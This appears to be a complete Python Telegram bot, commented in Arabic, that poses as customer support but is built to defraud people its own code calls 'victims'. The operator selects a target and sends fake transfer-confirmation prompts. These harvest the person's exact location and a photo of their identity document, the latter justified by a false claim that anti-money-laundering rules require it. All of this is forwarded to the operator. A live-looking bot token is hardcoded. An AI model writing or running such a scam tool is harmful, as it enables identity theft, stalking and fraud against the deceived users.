#!/usr/bin/env python3
"""
بوت تليجرام متكامل - للتواصل مع أي متصل
"""

import os
import time
import logging
from datetime import datetime
from telebot import TeleBot, types

# ================== الإعدادات ==================
BOT_TOKEN = "8680472604:AAH8b0pnjse3s80jN3M_NxrfewFe0jPzRCw"
OWNER_ID = 8391968596
# ==============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
bot = TeleBot(BOT_TOKEN)

visitors = {}
current_target = None  # سيتم تعيينه عند اختيار ضحية

# ================== الأوامر الأساسية ==================

@bot.message_handler(commands=['start'])
def start_handler(message):
    cid = message.chat.id
    uid = message.from_user.id
    uname = message.from_user.username or ""
    fname = message.from_user.first_name or ""

    visitors[cid] = {
        'username': uname,
        'name': fname,
        'user_id': uid,
        'first_seen': datetime.now().isoformat()
    }

    # إرسال إشعار للمطور عند أي متصل جديد
    if uid != OWNER_ID:
        bot.send_message(OWNER_ID, 
            f"🆕 **متصل جديد!**\n"
            f"👤 @{uname}\n"
            f"🆔 `{uid}`\n"
            f"📝 {fname}\n"
            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M')}",
            parse_mode="Markdown")

    if uid == OWNER_ID:
        show_admin_panel(cid)
        return

    # رسالة ترحيب للضيف
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📞 تواصل مع الدعم"))
    
    bot.send_message(cid, 
        "👋 مرحباً بك في خدمة العملاء.\n"
        "للحصول على المساعدة، اضغط على الزر أدناه.",
        reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "📞 تواصل مع الدعم" and m.from_user.id != OWNER_ID)
def support_request(message):
    cid = message.chat.id
    bot.send_message(cid, "📞 جاري توصيلك بأحد الممثلين...")
    bot.send_message(OWNER_ID, 
        f"📞 **طلب تواصل من:**\n"
        f"👤 @{message.from_user.username}\n"
        f"🆔 `{message.from_user.id}`")

# ================== لوحة تحكم المطور ==================

def show_admin_panel(cid):
    # عرض قائمة المتصلين أولاً
    if visitors:
        msg = "📊 **المتصلون حالياً:**\n\n"
        for cid, data in visitors.items():
            uname = data.get('username', '?') or 'بدون يوزر'
            msg += f"🆔 `{cid}` - @{uname}\n"
        bot.send_message(cid, msg, parse_mode="Markdown")
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        "📍 طلب موقع", 
        "📸 طلب صورة",
        "📨 إرسال رسالة",
        "🎤 إرسال صوت",
        "📷 إرسال صورة",
        "🎥 إرسال فيديو",
        "📊 تحديث المتصلين",
        "🔄 إعادة تشغيل"
    )
    
    bot.send_message(cid, 
        "🟢 **لوحة التحكم المتكاملة**\n\n"
        "📍 طلب موقع - يطلب من الضحية إرسال موقعه\n"
        "📸 طلب صورة - يطلب من الضحية إرسال صورته\n"
        "📨 إرسال رسالة - تكتب رسالة وترسلها للضحية\n"
        "🎤 إرسال صوت - ترفع ملف صوتي وترسله للضحية\n"
        "📷 إرسال صورة - ترفع صورة وترسلها للضحية\n"
        "🎥 إرسال فيديو - ترفع فيديو وترسله للضحية\n\n"
        "⚠️ **اختر الضحية أولاً:** استخدم الأمر /select [ID]",
        reply_markup=markup,
        parse_mode="Markdown")

# ================== اختيار الضحية ==================

@bot.message_handler(commands=['select'])
def select_target(message):
    global current_target
    try:
        target_id = int(message.text.split()[1])
        if target_id in visitors:
            current_target = target_id
            data = visitors[target_id]
            bot.send_message(OWNER_ID, 
                f"✅ **تم اختيار الضحية:**\n"
                f"👤 @{data.get('username', 'بدون يوزر')}\n"
                f"🆔 `{target_id}`",
                parse_mode="Markdown")
        else:
            bot.send_message(OWNER_ID, "❌ هذا المعرف غير موجود في قائمة المتصلين")
    except:
        bot.send_message(OWNER_ID, 
            "❌ **الاستخدام الصحيح:**\n"
            "/select [ID]\n"
            "مثال: /select 123456789")

# ================== طلب الموقع ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📍 طلب موقع")
def request_location(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** /select [ID]")
        return

    text = """📍 **تأكيد الموقع الجغرافي**

لإتمام عملية التحويل، يرجى مشاركة موقعك الحالي.

🔒 هذا الإجراء آمن ومشفر.
⏳ سيتم إلغاء التحويل تلقائياً بعد 24 ساعة."""
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📍 مشاركة الموقع", request_location=True)
    markup.add(btn)
    
    bot.send_message(current_target, text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(OWNER_ID, "✅ تم إرسال طلب موقع للضحية")

# ================== طلب صورة ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📸 طلب صورة")
def request_photo(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** /select [ID]")
        return

    text = """🆔 **توثيق الهوية**

لإتمام التحويل، يرجى إرسال صورة واضحة لهويتك.

⚠️ هذا الإجراء إلزامي وفقاً لقوانين مكافحة غسيل الأموال."""
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📸 إرسال صورة")
    markup.add(btn)
    
    bot.send_message(current_target, text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(OWNER_ID, "✅ تم إرسال طلب صورة للضحية")

# ================== استقبال الموقع ==================

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if message.location:
        lat = message.location.latitude
        lon = message.location.longitude
        
        sender_id = message.from_user.id
        if sender_id in visitors:
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            msg = f"""📍 **تم استلام موقع الضحية!**

**العرض:** `{lat}`
**الطول:** `{lon}`
**الدقة:** {message.location.horizontal_accuracy or 'غير متوفر'} متر

🔗 [فتح في خرائط جوجل]({maps_link})"""
            
            bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
            bot.send_location(OWNER_ID, lat, lon)

# ================== استقبال الصور ==================

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if message.photo:
        photo = message.photo[-1]
        file_info = bot.get_file(photo.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs("photos", exist_ok=True)
        file_path = f"photos/target_photo_{timestamp}.jpg"
        
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        with open(file_path, 'rb') as f:
            bot.send_photo(OWNER_ID, f, caption=f"📸 **صورة من الضحية**\n⏰ {timestamp}")

# ================== إرسال رسالة للضحية ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 إرسال رسالة")
def send_custom_message_prompt(message):
    bot.send_message(OWNER_ID, "✏️ **أرسل النص الذي تريد إرساله للضحية:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_custom_message)

def process_custom_message(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** /select [ID]")
        return
    
    bot.send_message(current_target, f"📨 **رسالة من الدعم:**\n{message.text}")
    bot.send_message(OWNER_ID, f"✅ **تم إرسال رسالتك للضحية:**\n\n{message.text}")

# ================== إرسال صوت ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🎤 إرسال صوت")
def send_audio_prompt(message):
    bot.send_message(OWNER_ID, "🎤 **أرسل الملف الصوتي (OGG/MP3) الذي تريد إرساله للضحية:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_audio)

def process_audio(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** /select [ID]")
        return
    
    if message.audio or message.voice:
        if message.audio:
            bot.send_audio(current_target, message.audio.file_id)
        else:
            bot.send_voice(current_target, message.voice.file_id)
        bot.send_message(OWNER_ID, "✅ تم إرسال الملف الصوتي للضحية")
    else:
        bot.send_message(OWNER_ID, "❌ يرجى إرسال ملف صوتي صحيح")

# ================== إرسال صورة ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📷 إرسال صورة")
def send_photo_prompt(message):
    bot.send_message(OWNER_ID, "📷 **أرسل الصورة التي تريد إرسالها للضحية:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_photo)

def process_photo(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** /select [ID]")
        return
    
    if message.photo:
        bot.send_photo(current_target, message.photo[-1].file_id, caption="📷 صورة من الدعم")
        bot.send_message(OWNER_ID, "✅ تم إرسال الصورة للضحية")
    else:
        bot.send_message(OWNER_ID, "❌ يرجى إرسال صورة صحيحة")

# ================== إرسال فيديو ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🎥 إرسال فيديو")
def send_video_prompt(message):
    bot.send_message(OWNER_ID, "🎥 **أرسل الفيديو الذي تريد إرساله للضحية:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_video)

def process_video(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** /select [ID]")
        return
    
    if message.video:
        bot.send_video(current_target, message.video.file_id, caption="🎥 فيديو من الدعم")
        bot.send_message(OWNER_ID, "✅ تم إرسال الفيديو للضحية")
    else:
        bot.send_message(OWNER_ID, "❌ يرجى إرسال فيديو صحيح")

# ================== تحديث المتصلين ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📊 تحديث المتصلين")
def show_visitors(message):
    if not visitors:
        bot.send_message(OWNER_ID, "📊 لا يوجد متصلين")
        return
    
    msg = "📊 **المتصلون:**\n\n"
    for cid, data in visitors.items():
        uname = data.get('username', '?') or 'بدون يوزر'
        name = data.get('name', '?')
        is_current = "👉" if cid == current_target else "⚪"
        msg += f"{is_current} `{cid}` - @{uname} ({name})\n"
    
    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")

# ================== إعادة تشغيل ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔄 إعادة تشغيل")
def restart_bot(message):
    bot.send_message(OWNER_ID, "🔄 جاري إعادة التشغيل...")
    os._exit(0)

# ================== استقبال أي رسالة ==================

@bot.message_handler(func=lambda m: True)
def catch_all(message):
    cid = message.chat.id
    uid = message.from_user.id
    uname = message.from_user.username or ""
    
    # إذا كانت الرسالة من شخص ليس المطور
    if uid != OWNER_ID:
        text = message.text or "[وسائط]"
        bot.send_message(OWNER_ID, 
            f"✉️ **رسالة جديدة:**\n"
            f"👤 @{uname}\n"
            f"🆔 `{uid}`\n"
            f"💬 {text}",
            parse_mode="Markdown")

# ================== التشغيل ==================

if __name__ == "__main__":
    os.makedirs("photos", exist_ok=True)
    print("✅ البوت شغال! انتظار اتصال الضحايا...")
    
    try:
        bot.send_message(OWNER_ID, "🟢 **البوت شغال!**\n/start للوحة التحكم", parse_mode="Markdown")
    except:
        pass
    
    bot.infinity_polling()
